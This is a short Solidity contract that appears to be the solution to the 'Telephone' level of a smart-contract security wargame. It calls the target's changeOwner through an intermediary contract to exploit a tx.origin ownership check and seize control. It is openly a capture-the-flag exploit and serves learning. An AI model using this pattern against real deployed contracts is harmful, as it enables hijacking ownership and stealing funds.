// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Level4Solution is Ownable {
    address telephoneAddress;

    constructor(address _telephoneAddress) {
        telephoneAddress = _telephoneAddress;
    }

    function takeControl() public onlyOwner {
        ITelephone(telephoneAddress).changeOwner(msg.sender);
    }
}
